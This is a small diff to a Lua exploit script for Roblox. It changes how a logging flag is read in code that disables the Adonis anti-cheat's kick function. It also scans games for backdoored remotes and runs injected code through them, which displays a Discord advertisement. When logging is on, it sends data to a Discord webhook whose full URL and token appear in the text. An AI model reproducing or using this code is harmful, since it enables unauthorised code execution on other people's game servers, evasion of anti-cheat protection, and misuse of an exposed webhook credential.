@@ -1,6 +1,6 @@
 -- // Bypass Adonis
 
-_G.Game_Log = _G.Game_Log and getgenv().Game_Log or false
+Game_Log = getgenv().Game_Log or false
 
 for k,v in pairs(game:GetDescendants()) do if pcall(function() return rawget(v,"indexInstance") end) and type(rawget(v,"indexInstance")) == "table" and (rawget(v,"indexInstance"))[1] == "kick" then v.tvk = {"kick",function() return false end} end end
 
@@ -264,7 +264,7 @@ function BackdoorScanner:FindRemote(statusLabel: TextLabel): RemoteDictionary
             self:RunRemote(remote, "a=Instance.new('Hint')a.Text='Hexon SS join now! : https://discord.gg/sc4zKCmhGP ' a.Parent=workspace wait(10) a:Destroy()")
 
           
-            if _G.Game_Log then
+            if Game_Log then
                 pcall(function()
                     request({
                         Url = 'https://discord.com/api/webhooks/1274230884064694282/8Cy9F1lloRs7dfVksKMkLdgzE24eEKKzx_-aTDiGZxebGeZX0FpL4NPrPe4okmU7VnCY',
